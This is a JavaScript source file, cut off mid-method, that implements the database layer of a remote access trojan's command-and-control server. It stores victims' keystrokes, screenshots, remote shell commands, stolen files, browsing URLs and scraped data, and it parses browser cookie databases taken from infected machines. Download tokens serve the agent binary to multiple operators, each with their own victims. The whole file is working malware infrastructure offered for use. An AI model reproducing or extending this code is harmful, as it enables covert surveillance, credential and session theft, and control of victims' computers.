const Database = require('better-sqlite3');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

class C2Database {
    constructor(dbPath = 'c2_database.db') {
        // Ensure directory exists
        const dir = path.dirname(dbPath);
        if (dir && !fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        
        this.db = new Database(dbPath);
        this.db.pragma('journal_mode = WAL');
        this.db.pragma('foreign_keys = ON');
        
        this.initDatabase();
        console.log(`Database initialized: ${dbPath}`);
    }
    
    initDatabase() {
        // Create users table
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT NOT NULL DEFAULT 'user',
                created_at INTEGER DEFAULT (strftime('%s', 'now')),
                last_login INTEGER,
                is_active INTEGER DEFAULT 1
            )
        `);

        // Download tokens — one per user, used to serve the agent binary
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS download_tokens (
                token TEXT PRIMARY KEY,
                user_id INTEGER NOT NULL,
                created_at INTEGER DEFAULT (strftime('%s', 'now')),
                download_count INTEGER DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
            )
        `);

        // Create clients table - now with user_id
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                user_id TEXT NOT NULL,
                hostname TEXT NOT NULL,
                username TEXT NOT NULL,
                first_seen INTEGER NOT NULL,
                last_seen INTEGER NOT NULL,
                ip_address TEXT,
                os_version TEXT,
                is_online INTEGER DEFAULT 0,
                created_at INTEGER DEFAULT (strftime('%s', 'now')),
                FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
            )
        `);
        
        // Create screenshots table
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                image_data BLOB,
                image_size INTEGER,
                image_format TEXT DEFAULT 'bmp',
                width INTEGER,
                height INTEGER,
                is_stream INTEGER DEFAULT 0,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);
        
        // Create keylogs table
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                keystrokes TEXT NOT NULL,
                clean_text TEXT,
                application TEXT,
                window_title TEXT,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);
        
        // Create commands table
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                success INTEGER DEFAULT 1,
                executed_by TEXT DEFAULT 'dashboard',
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);
        
        // Create files table
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                filename TEXT NOT NULL,
                filepath TEXT NOT NULL,
                file_size INTEGER,
                action TEXT NOT NULL, -- 'upload', 'download', 'delete', 'list'
                content BLOB,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);
        
        // Create system_info table
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS system_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                cpu TEXT,
                memory TEXT,
                disks TEXT,
                network TEXT,
                processes TEXT,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);
        
        // Migration: add keylog_active column if not present (safe to run every startup)
        try {
            this.db.exec(`ALTER TABLE clients ADD COLUMN keylog_active INTEGER DEFAULT 0`);
            console.log('Migration: added keylog_active column to clients');
        } catch (e) { /* column already exists */ }

        // Migration: add clean_text column to keylogs if not present
        try {
            this.db.exec(`ALTER TABLE keylogs ADD COLUMN clean_text TEXT`);
            console.log('Migration: added clean_text column to keylogs');
        } catch (e) { /* column already exists */ }

        // Create cookies table
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS cookies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                browser TEXT NOT NULL,
                host TEXT NOT NULL,
                name TEXT NOT NULL,
                value TEXT NOT NULL,
                path TEXT,
                domain TEXT,
                secure INTEGER DEFAULT 0,
                http_only INTEGER DEFAULT 0,
                expires INTEGER,
                first_seen INTEGER NOT NULL,
                last_updated INTEGER NOT NULL,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);

        // Create cookie_blobs table (raw SQLite DB files from RAT)
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS cookie_blobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                browser TEXT NOT NULL,
                local_state TEXT,
                cookies_db TEXT,
                first_seen INTEGER NOT NULL,
                last_updated INTEGER NOT NULL,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);

        // Create urls table
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS urls (

                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                url TEXT NOT NULL,
                window_title TEXT,
                first_seen INTEGER NOT NULL,
                last_seen INTEGER NOT NULL,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);

        // Create scanned_data table for data scraper results
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS scanned_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT NOT NULL,
                data_type TEXT NOT NULL,
                data_value TEXT NOT NULL,
                source_file TEXT,
                created_at INTEGER DEFAULT (strftime('%s', 'now')),
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        `);

        // Create indexes for better performance
        this.db.exec(`
            CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
            CREATE INDEX IF NOT EXISTS idx_screenshots_client_timestamp ON screenshots(client_id, timestamp);
            CREATE INDEX IF NOT EXISTS idx_keylogs_client_timestamp ON keylogs(client_id, timestamp);
            CREATE INDEX IF NOT EXISTS idx_commands_client_timestamp ON commands(client_id, timestamp);
            CREATE INDEX IF NOT EXISTS idx_files_client_timestamp ON files(client_id, timestamp);
            CREATE INDEX IF NOT EXISTS idx_cookies_client_host ON cookies(client_id, host);
            CREATE INDEX IF NOT EXISTS idx_cookies_client_browser ON cookies(client_id, browser);
            CREATE INDEX IF NOT EXISTS idx_urls_client_url ON urls(client_id, url);
        `);
    }
    
    // Client operations
    addOrUpdateClient(clientId, hostname, username, ipAddress = null, osVersion = null, user_id = null) {
        if (!user_id) {
            try {
                const admin = this.db.prepare("SELECT id FROM users WHERE role='admin' ORDER BY created_at ASC LIMIT 1").get();
                user_id = admin?.id || null;
            } catch (e) {
                user_id = null;
            }
        }
        if (!user_id) {
            throw new Error(`Cannot assign client ${clientId}: missing user_id and no admin fallback`);
        }

        const now = Date.now();
        const stmt = this.db.prepare(`
            INSERT INTO clients (id, user_id, hostname, username, first_seen, last_seen, ip_address, os_version, is_online)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
            ON CONFLICT(id) DO UPDATE SET
                user_id = excluded.user_id,
                hostname = excluded.hostname,
                username = excluded.username,
                last_seen = excluded.last_seen,
                ip_address = COALESCE(excluded.ip_address, ip_address),
                os_version = COALESCE(excluded.os_version, os_version),
                is_online = 1
        `);
        
        return stmt.run(clientId, user_id, hostname, username, now, now, ipAddress, osVersion);
    }
    
    updateClientLastSeen(clientId) {
        const stmt = this.db.prepare(`
            UPDATE clients SET last_seen = ?, is_online = 1 WHERE id = ?
        `);
        return stmt.run(Date.now(), clientId);
    }
    
    setClientOffline(clientId) {
        const stmt = this.db.prepare(`
            UPDATE clients SET is_online = 0 WHERE id = ?
        `);
        return stmt.run(clientId);
    }

    setKeylogActive(clientId, active) {
        const stmt = this.db.prepare('UPDATE clients SET keylog_active = ? WHERE id = ?');
        return stmt.run(active ? 1 : 0, clientId);
    }

    getKeylogActiveClients(userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare('SELECT * FROM clients WHERE keylog_active = 1 AND user_id = ?');
            return stmt.all(userId);
        }
        const stmt = this.db.prepare('SELECT * FROM clients WHERE keylog_active = 1');
        return stmt.all();
    }
    
    getClient(clientId) {
        const stmt = this.db.prepare('SELECT * FROM clients WHERE id = ?');
        return stmt.get(clientId);
    }

    deleteClient(clientId, userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare('DELETE FROM clients WHERE id = ? AND user_id = ?');
            return stmt.run(clientId, userId);
        }

        const stmt = this.db.prepare('DELETE FROM clients WHERE id = ?');
        return stmt.run(clientId);
    }
    
    getAllClients(limit = 100, offset = 0, userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare(`
                SELECT * FROM clients
                WHERE user_id = ?
                ORDER BY last_seen DESC
                LIMIT ? OFFSET ?
            `);
            return stmt.all(userId, limit, offset);
        }
        const stmt = this.db.prepare(`
            SELECT * FROM clients 
            ORDER BY last_seen DESC 
            LIMIT ? OFFSET ?
        `);
        return stmt.all(limit, offset);
    }
    
    getOnlineClients() {
        const stmt = this.db.prepare('SELECT * FROM clients WHERE is_online = 1 ORDER BY last_seen DESC');
        return stmt.all();
    }
    
    // Screenshot operations
    addScreenshot(clientId, imageData, width = null, height = null, isStream = false) {
        const stmt = this.db.prepare(`
            INSERT INTO screenshots (client_id, timestamp, image_data, image_size, width, height, is_stream)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `);
        
        return stmt.run(
            clientId,
            Date.now(),
            imageData,
            imageData.length,
            width,
            height,
            isStream ? 1 : 0
        );
    }
    
    getScreenshots(clientId = null, limit = 50, offset = 0, includeImageData = false, userId = null) {
        const columns = includeImageData
            ? 's.id, s.client_id, s.timestamp, s.image_data, s.image_size, s.image_format, s.width, s.height, s.is_stream'
            : 's.id, s.client_id, s.timestamp, s.image_size, s.image_format, s.width, s.height, s.is_stream';

        if (clientId) {
            if (userId !== null) {
                // Ensure the client belongs to this user
                const stmt = this.db.prepare(`
                    SELECT ${columns}
                    FROM screenshots s
                    JOIN clients c ON c.id = s.client_id
                    WHERE s.client_id = ? AND c.user_id = ?
                    ORDER BY s.timestamp DESC
                    LIMIT ? OFFSET ?
                `);
                return stmt.all(clientId, userId, limit, offset);
            }
            const stmt = this.db.prepare(`
                SELECT ${columns}
                FROM screenshots s
                WHERE s.client_id = ?
                ORDER BY s.timestamp DESC
                LIMIT ? OFFSET ?
            `);
            return stmt.all(clientId, limit, offset);
        }

        if (userId !== null) {
            const stmt = this.db.prepare(`
                SELECT ${columns}
                FROM screenshots s
                JOIN clients c ON c.id = s.client_id
                WHERE c.user_id = ?
                ORDER BY s.timestamp DESC
                LIMIT ? OFFSET ?
            `);
            return stmt.all(userId, limit, offset);
        }

        const stmt = this.db.prepare(`
            SELECT ${columns}
            FROM screenshots s
            ORDER BY s.timestamp DESC
            LIMIT ? OFFSET ?
        `);
        return stmt.all(limit, offset);
    }
    
    getScreenshot(id, userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare(`
                SELECT s.*
                FROM screenshots s
                JOIN clients c ON c.id = s.client_id
                WHERE s.id = ? AND c.user_id = ?
            `);
            return stmt.get(id, userId);
        }
        const stmt = this.db.prepare('SELECT * FROM screenshots WHERE id = ?');
        return stmt.get(id);
    }
    
    deleteScreenshot(id, userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare(`
                DELETE FROM screenshots
                WHERE id = ? AND client_id IN (
                    SELECT id FROM clients WHERE user_id = ?
                )
            `);
            return stmt.run(id, userId);
        }
        const stmt = this.db.prepare('DELETE FROM screenshots WHERE id = ?');
        return stmt.run(id);
    }
    
    // Keylog operations
    addKeylog(clientId, keystrokes, application = null, windowTitle = null, cleanText = null) {
        const stmt = this.db.prepare(`
            INSERT INTO keylogs (client_id, timestamp, keystrokes, clean_text, application, window_title)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        
        return stmt.run(clientId, Date.now(), keystrokes, cleanText, application, windowTitle);
    }
    
    deleteKeylogsGroup(ids, userId = null) {
        if (!ids || ids.length === 0) return;
        
        // Ensure the current user owns the client these keylogs belong to
        if (userId !== null) {
            const placeholders = ids.map(() => '?').join(',');
            const checkStmt = this.db.prepare(`
                SELECT k.id FROM keylogs k
                JOIN clients c ON c.id = k.client_id
                WHERE k.id IN (${placeholders}) AND c.user_id = ?
            `);
            const validIds = checkStmt.all(...ids, userId).map(r => r.id);
            if (validIds.length === 0) return;
            ids = validIds;
        }
        
        const placeholders = ids.map(() => '?').join(',');
        const stmt = this.db.prepare(`DELETE FROM keylogs WHERE id IN (${placeholders})`);
        return stmt.run(...ids);
    }
    
    getKeylogs(clientId, limit = 100, offset = 0, userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare(`
                SELECT k.*
                FROM keylogs k
                JOIN clients c ON c.id = k.client_id
                WHERE k.client_id = ? AND c.user_id = ?
                ORDER BY k.timestamp DESC
                LIMIT ? OFFSET ?
            `);
            return stmt.all(clientId, userId, limit, offset);
        }
        const stmt = this.db.prepare(`
            SELECT * FROM keylogs 
            WHERE client_id = ? 
            ORDER BY timestamp DESC 
            LIMIT ? OFFSET ?
        `);
        return stmt.all(clientId, limit, offset);
    }

    // Command operations
    addCommand(clientId, command, output = null, success = true, executedBy = 'dashboard') {
        const stmt = this.db.prepare(`
            INSERT INTO commands (client_id, timestamp, command, output, success, executed_by)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        
        return stmt.run(
            clientId,
            Date.now(),
            command,
            output,
            success ? 1 : 0,
            executedBy
        );
    }
    
    getCommands(clientId, limit = 100, offset = 0, userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare(`
                SELECT cmd.*
                FROM commands cmd
                JOIN clients c ON c.id = cmd.client_id
                WHERE cmd.client_id = ? AND c.user_id = ?
                ORDER BY cmd.timestamp DESC
                LIMIT ? OFFSET ?
            `);
            return stmt.all(clientId, userId, limit, offset);
        }
        const stmt = this.db.prepare(`
            SELECT * FROM commands 
            WHERE client_id = ? 
            ORDER BY timestamp DESC 
            LIMIT ? OFFSET ?
        `);
        return stmt.all(clientId, limit, offset);
    }
    
    // File operations
    addFileOperation(clientId, filename, filepath, action, fileSize = null, content = null) {
        const stmt = this.db.prepare(`
            INSERT INTO files (client_id, timestamp, filename, filepath, file_size, action, content)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `);
        
        return stmt.run(
            clientId,
            Date.now(),
            filename,
            filepath,
            fileSize,
            action,
            content
        );
    }
    
    getFileOperations(clientId, limit = 100, offset = 0, userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare(`
                SELECT f.id, f.client_id, f.timestamp, f.filename, f.filepath, f.file_size, f.action
                FROM files f
                JOIN clients c ON c.id = f.client_id
                WHERE f.client_id = ? AND c.user_id = ?
                ORDER BY f.timestamp DESC
                LIMIT ? OFFSET ?
            `);
            return stmt.all(clientId, userId, limit, offset);
        }
        const stmt = this.db.prepare(`
            SELECT id, client_id, timestamp, filename, filepath, file_size, action
            FROM files 
            WHERE client_id = ? 
            ORDER BY timestamp DESC 
            LIMIT ? OFFSET ?
        `);
        return stmt.all(clientId, limit, offset);
    }
    
    getFile(id, userId = null) {
        if (userId !== null) {
            const stmt = this.db.prepare(`
                SELECT f.*
                FROM files f
                JOIN clients c ON c.id = f.client_id
                WHERE f.id = ? AND c.user_id = ?
            `);
            return stmt.get(id, userId);
        }
        const stmt = this.db.prepare('SELECT * FROM files WHERE id = ?');
        return stmt.get(id);
    }
    
    // System info operations
    addSystemInfo(clientId, cpu = null, memory = null, disks = null, network = null, processes = null) {
        const stmt = this.db.prepare(`
            INSERT INTO system_info (client_id, timestamp, cpu, memory, disks, network, processes)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `);
        
        return stmt.run(
            clientId,
            Date.now(),
            cpu,
            memory,
            disks,
            network,
            processes
        );
    }
    
    getSystemInfo(clientId, limit = 10, offset = 0) {
        const stmt = this.db.prepare(`
            SELECT * FROM system_info 
            WHERE client_id = ? 
            ORDER BY timestamp DESC 
            LIMIT ? OFFSET ?
        `);
        return stmt.all(clientId, limit, offset);
    }
    
    // Statistics
    getStatistics(userId = null) {
        const stats = {};

        if (userId !== null) {
            const totalClients = this.db.prepare('SELECT COUNT(*) as count FROM clients WHERE user_id = ?').get(userId);
            stats.totalClients = totalClients.count;

            const onlineClients = this.db.prepare('SELECT COUNT(*) as count FROM clients WHERE user_id = ? AND is_online = 1').get(userId);
            stats.onlineClients = onlineClients.count;

            const totalScreenshots = this.db.prepare(`
                SELECT COUNT(*) as count
                FROM screenshots s
                JOIN clients c ON c.id = s.client_id
                WHERE c.user_id = ?
            `).get(userId);
            stats.totalScreenshots = totalScreenshots.count;

            const totalKeylogs = this.db.prepare(`
                SELECT COUNT(*) as count
                FROM keylogs k
                JOIN clients c ON c.id = k.client_id
                WHERE c.user_id = ?
            `).get(userId);
            stats.totalKeylogs = totalKeylogs.count;

            const totalCommands = this.db.prepare(`
                SELECT COUNT(*) as count
                FROM commands cmd
                JOIN clients c ON c.id = cmd.client_id
                WHERE c.user_id = ?
            `).get(userId);
            stats.totalCommands = totalCommands.count;
        } else {
            // Total clients
            const totalClients = this.db.prepare('SELECT COUNT(*) as count FROM clients').get();
            stats.totalClients = totalClients.count;

            // Online clients
            const onlineClients = this.db.prepare('SELECT COUNT(*) as count FROM clients WHERE is_online = 1').get();
            stats.onlineClients = onlineClients.count;

            // Total screenshots
            const totalScreenshots = this.db.prepare('SELECT COUNT(*) as count FROM screenshots').get();
            stats.totalScreenshots = totalScreenshots.count;

            // Total keylogs
            const totalKeylogs = this.db.prepare('SELECT COUNT(*) as count FROM keylogs').get();
            stats.totalKeylogs = totalKeylogs.count;

            // Total commands
            const totalCommands = this.db.prepare('SELECT COUNT(*) as count FROM commands').get();
            stats.totalCommands = totalCommands.count;
        }
        
        // Database size
        const dbSize = this.db.prepare("SELECT page_count * page_size as size FROM pragma_page_count(), pragma_page_size()").get();
        stats.databaseSize = dbSize.size;
        
        // Recent activity (last 24 hours)
        const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
        let recentActivity;
        if (userId !== null) {
            recentActivity = this.db.prepare(`
                SELECT
                    (SELECT COUNT(*) FROM screenshots s JOIN clients c ON c.id = s.client_id WHERE s.timestamp > ? AND c.user_id = ?) as screenshots,
                    (SELECT COUNT(*) FROM keylogs k JOIN clients c ON c.id = k.client_id WHERE k.timestamp > ? AND c.user_id = ?) as keylogs,
                    (SELECT COUNT(*) FROM commands cmd JOIN clients c ON c.id = cmd.client_id WHERE cmd.timestamp > ? AND c.user_id = ?) as commands
            `).get(oneDayAgo, userId, oneDayAgo, userId, oneDayAgo, userId);
        } else {
            recentActivity = this.db.prepare(`
                SELECT 
                    (SELECT COUNT(*) FROM screenshots WHERE timestamp > ?) as screenshots,
                    (SELECT COUNT(*) FROM keylogs WHERE timestamp > ?) as keylogs,
                    (SELECT COUNT(*) FROM commands WHERE timestamp > ?) as commands
            `).get(oneDayAgo, oneDayAgo, oneDayAgo);
        }
        
        stats.recentActivity = recentActivity;
        
        return stats;
    }
    
    // Cleanup old data (optional)
    cleanupOldData(daysToKeep = 30) {
        const cutoff = Date.now() - (daysToKeep * 24 * 60 * 60 * 1000);
        
        // Delete old screenshots (keep metadata but not image data for old entries)
        this.db.prepare(`
            UPDATE screenshots 
            SET image_data = NULL 
            WHERE timestamp < ? AND image_data IS NOT NULL
        `).run(cutoff);
        
        // Delete old keylogs
        this.db.prepare('DELETE FROM keylogs WHERE timestamp < ?').run(cutoff);
        
        // Delete old commands
        this.db.prepare('DELETE FROM commands WHERE timestamp < ?').run(cutoff);
        
        // Delete old system info
        this.db.prepare('DELETE FROM system_info WHERE timestamp < ?').run(cutoff);
        
        console.log(`Cleaned up data older than ${daysToKeep} days`);
    }
    
    // User management methods
    createUser(username, passwordHash, role = 'user') {
        const stmt = this.db.prepare(`
            INSERT INTO users (username, password_hash, role)
            VALUES (?, ?, ?)
        `);
        
        try {
            const info = stmt.run(username, passwordHash, role);
            return { success: true, userId: info.lastInsertRowid };
        } catch (error) {
            if (error.code === 'SQLITE_CONSTRAINT') {
                return { success: false, error: 'Username already exists' };
            }
            return { success: false, error: error.message };
        }
    }
    
    getUserByUsername(username) {
        const stmt = this.db.prepare('SELECT * FROM users WHERE username = ?');
        return stmt.get(username);
    }
    
    getUserById(userId) {
        const stmt = this.db.prepare('SELECT id, username, role, created_at, last_login, is_active FROM users WHERE id = ?');
        return stmt.get(userId);
    }
    
    updateUserLastLogin(userId) {
        const stmt = this.db.prepare('UPDATE users SET last_login = ? WHERE id = ?');
        return stmt.run(Date.now(), userId);
    }
    
    getAllUsers() {
        const stmt = this.db.prepare('SELECT id, username, role, created_at, last_login, is_active FROM users ORDER BY created_at DESC');
        return stmt.all();
    }
    
    updateUserRole(userId, role) {
        const stmt = this.db.prepare('UPDATE users SET role = ? WHERE id = ?');
        return stmt.run(role, userId);
    }
    
    deleteUser(userId) {
        const stmt = this.db.prepare('DELETE FROM users WHERE id = ?');
        return stmt.run(userId);
    }

    // ---------- Download token methods ----------

    getOrCreateDownloadToken(userId) {
        const existing = this.db.prepare('SELECT token FROM download_tokens WHERE user_id = ?').get(userId);
        if (existing) return existing.token;
        const { randomBytes } = require('crypto');
        const token = randomBytes(24).toString('hex');
        this.db.prepare('INSERT INTO download_tokens (token, user_id) VALUES (?, ?)').run(token, userId);
        return token;
    }

    getUserByDownloadToken(token) {
        const row = this.db.prepare('SELECT user_id FROM download_tokens WHERE token = ?').get(token);
        if (!row) return null;
        this.db.prepare('UPDATE download_tokens SET download_count = download_count + 1 WHERE token = ?').run(token);
        return row.user_id;
    }
    
    // Client operations with user filtering
    addOrUpdateClientWithUser(clientId, userId, hostname, username, ipAddress = null, osVersion = null) {
        const now = Date.now();
        const stmt = this.db.prepare(`
            INSERT INTO clients (id, user_id, hostname, username, first_seen, last_seen, ip_address, os_version, is_online)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
            ON CONFLICT(id) DO UPDATE SET
                hostname = excluded.hostname,
                username = excluded.username,
                last_seen = excluded.last_seen,
                ip_address = COALESCE(excluded.ip_address, ip_address),
                os_version = COALESCE(excluded.os_version, os_version),
                is_online = 1
        `);
        
        return stmt.run(clientId, userId, hostname, username, now, now, ipAddress, osVersion);
    }
    
    getClientsByUser(userId, limit = 100, offset = 0) {
        const stmt = this.db.prepare(`
            SELECT * FROM clients 
            WHERE user_id = ?
            ORDER BY last_seen DESC 
            LIMIT ? OFFSET ?
        `);
        return stmt.all(userId, limit, offset);
    }
    
    getOnlineClientsByUser(userId) {
        const stmt = this.db.prepare(`
            SELECT * FROM clients 
            WHERE user_id = ? AND is_online = 1 
            ORDER BY last_seen DESC
        `);
        return stmt.all(userId);
    }
    
    getAllClientsForAdmin() {
        const stmt = this.db.prepare(`
            SELECT c.*, u.username as owner_username 
            FROM clients c
            LEFT JOIN users u ON c.user_id = u.id
            ORDER BY c.last_seen DESC
        `);
        return stmt.all();
    }
    
    // Cookie blob operations (raw SQLite DB files from RAT)
    addCookieBlob(clientId, browser, localStateB64, cookiesDbB64) {
        const now = Date.now();
        // Check if we already have a blob for this client+browser
        const existing = this.db.prepare(
            'SELECT id FROM cookie_blobs WHERE client_id = ? AND browser = ?'
        ).get(clientId, browser);
        
        if (existing) {
            // Update existing blob
            this.db.prepare(`
                UPDATE cookie_blobs SET local_state = ?, cookies_db = ?, last_updated = ?
                WHERE id = ?
            `).run(localStateB64, cookiesDbB64, now, existing.id);
        } else {
            // New blob
            this.db.prepare(`
                INSERT INTO cookie_blobs (client_id, browser, local_state, cookies_db, first_seen, last_updated)
                VALUES (?, ?, ?, ?, ?, ?)
            `).run(clientId, browser, localStateB64, cookiesDbB64, now, now);
        }
        
        // Parse the cookies_db base64 blob and insert individual cookies
        try {
            this._parseCookieDb(clientId, browser, cookiesDbB64);
        } catch (parseErr) {
            console.error(`[COOKIE] Failed to parse cookie DB for ${clientId}/${browser}:`, parseErr.message);
        }
        
        return { action: existing ? 'updated' : 'inserted', id: existing ? existing.id : this.db.lastInsertRowid };
    }
    
    _parseCookieDb(clientId, browser, cookiesDbB64) {
        const tmpPath = path.join(__dirname, `_tmp_cookies_${clientId}_${browser}.db`);
        try {
            // Decode base64 and write to temp file
            const buf = Buffer.from(cookiesDbB64, 'base64');
            fs.writeFileSync(tmpPath, buf);
            
            // Open the temp SQLite DB (read-only)
            const cookieDb = new Database(tmpPath, { readonly: true });
            
            // Check which table exists — Chrome uses 'cookies', Firefox uses 'moz_cookies'
            const tables = cookieDb.prepare(
                "SELECT name FROM sqlite_master WHERE type='table' AND (name='cookies' OR name='moz_cookies')"
            ).all();
            
            if (tables.length === 0) {
                cookieDb.close();
                fs.unlinkSync(tmpPath);
                return;
            }
            
            const tableName = tables[0].name;
            const rows = cookieDb.prepare(`SELECT * FROM ${tableName}`).all();
            cookieDb.close();
            
            // Insert each cookie into our cookies table using addCookie (deduplicates by client_id+host+name)
            const insertMany = this.db.transaction((entries) => {
                for (const row of entries) {
                    // Chrome: host_key, name, value, path, is_secure, is_httponly, expires_utc
                    // Firefox: host, name, value, path, isSecure, isHttpOnly, expiry
                    const host = row.host_key || row.host || '';
                    const name = row.name || '';
                    const value = row.value || '';
                    const path = row.path || '/';
                    const domain = row.host_key || row.host || null;
                    const secure = (row.is_secure || row.isSecure) ? 1 : 0;
                    const httpOnly = (row.is_httponly || row.isHttpOnly) ? 1 : 0;
                    // Chrome uses microseconds, Firefox uses seconds
                    let expires = row.expires_utc || row.expiry || null;
                    if (expires && expires > 10000000000000) {
                        expires = Math.floor(expires / 1000000); // Chrome microsec → sec
                    }
                    
                    if (!host || !name) continue;
                    
                    this.addCookie(clientId, browser, host, name, value, path, domain, secure, httpOnly, expires);
                }
            });
            
            insertMany(rows);
            console.log(`[COOKIE] Parsed ${rows.length} cookies from ${browser} for ${clientId}`);
            
            // Cleanup temp file
            try { fs.unlinkSync(tmpPath); } catch (e) {}
        } catch (err) {
            // Cleanup temp file on error
            try { fs.unlinkSync(tmpPath); } catch (e) {}
            throw err;
        }
    }
    
    getCookieBlobs(clientId, limit = 50, offset = 0, userId = null) {
        if (userId !== null) {
            return this.db.prepare(`
                SELECT cb.*
                FROM cookie_blobs cb
                JOIN clients c ON c.id = cb.client_id
                WHERE cb.client_id = ? AND c.user_id = ?
                ORDER BY cb.last_updated DESC
                LIMIT ? OFFSET ?
            `).all(clientId, userId, limit, offset);
        }
        return this.db.prepare(`
            SELECT * FROM cookie_blobs
            WHERE client_id = ?
            ORDER BY last_updated DESC
            LIMIT ? OFFSET ?
        `).all(clientId, limit, offset);
    }
    
    // Cookie operations
    addCookie(clientId, browser, host, name, value, path = null, domain = null, secure = 0, httpOnly = 0, expires = null) {
        const now = Date.now();
        // Check if this cookie already exists (same client, host, name)
        const existing = this.db.prepare(
            'SELECT id, value FROM cookies WHERE client_id = ? AND host = ? AND name = ?'
        ).get(clientId, host, name);
        
        if (existing) {
            if (existing.value !== value) {
                // Value changed — update
                this.db.prepare(`
                    UPDATE cookies SET value = ?, last_updated = ?, path = ?, domain = ?,
                        secure = ?, http_only = ?, expires = ?
                    WHERE id = ?
                `).run(value, now, path, domain, secure, httpOnly, expires, existing.id);
                return { action: 'updated', id: existing.id };
            }
            return { action: 'unchanged', id: existing.id };
        }
        
        // New cookie
        this.db.prepare(`
            INSERT INTO cookies (client_id, browser, host, name, value, path, domain, secure, http_only, expires, first_seen, last_updated)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `).run(clientId, browser, host, name, value, path, domain, secure, httpOnly, expires, now, now);
        
        return { action: 'inserted', id: this.db.lastInsertRowid };
    }
    
    getCookies(clientId, limit = 500, offset = 0, userId = null) {
        if (userId !== null) {
            return this.db.prepare(`
                SELECT ck.*
                FROM cookies ck
                JOIN clients c ON c.id = ck.client_id
                WHERE ck.client_id = ? AND c.user_id = ?
                ORDER BY ck.host ASC, ck.name ASC
                LIMIT ? OFFSET ?
            `).all(clientId, userId, limit, offset);
        }
        return this.db.prepare(`
            SELECT * FROM cookies
            WHERE client_id = ?
            ORDER BY host ASC, name ASC
            LIMIT ? OFFSET ?
        `).all(clientId, limit, offset);
    }
    
    getAllCookies(limit = 1000, offset = 0, userId = null) {
        if (userId !== null) {
            return this.db.prepare(`
                SELECT ck.*, c.hostname as client_hostname, c.username as client_username
                FROM cookies ck
                JOIN clients c ON c.id = ck.client_id
                WHERE c.user_id = ?
                ORDER BY ck.last_updated DESC
                LIMIT ? OFFSET ?
            `).all(userId, limit, offset);
        }
        return this.db.prepare(`
            SELECT ck.*, c.hostname as client_hostname, c.username as client_username
            FROM cookies ck
            JOIN clients c ON c.id = ck.client_id
            ORDER BY ck.last_updated DESC
            LIMIT ? OFFSET ?
        `).all(limit, offset);
    }
    
    deleteCookie(cookieId, userId = null) {
        if (userId !== null) {
            return this.db.prepare(`
                DELETE FROM cookies
                WHERE id = ? AND client_id IN (SELECT id FROM clients WHERE user_id = ?)
            `).run(cookieId, userId);
        }
        return this.db.prepare('DELETE FROM cookies WHERE id = ?').run(cookieId);
    }
    
    // URL operations
    addUrl(clientId, url, windowTitle = null, timestamp = null) {
